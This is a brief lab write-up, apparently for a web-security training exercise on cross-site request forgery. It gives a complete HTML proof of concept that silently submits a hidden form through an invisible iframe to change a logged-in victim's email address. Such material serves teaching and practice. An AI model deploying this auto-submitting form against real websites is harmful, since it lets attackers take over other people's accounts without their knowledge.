# CSRF vulnerability with no defenses
> This lab's email change functionality is vulnerable to CSRF.
> To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
> You can log in to your own account using the following credentials: `wiener:peter`

```HTML
<html>
  <body>
    <h1>Hello World!</h1>
    <iframe style="display:none" name="csrf-iframe"></iframe>
    <form action="https://0a60008b044cda7780e1033b00c0007e.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
      <input type="hidden" name="email" value="sithum@sa.com">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
  </body>
</html>

```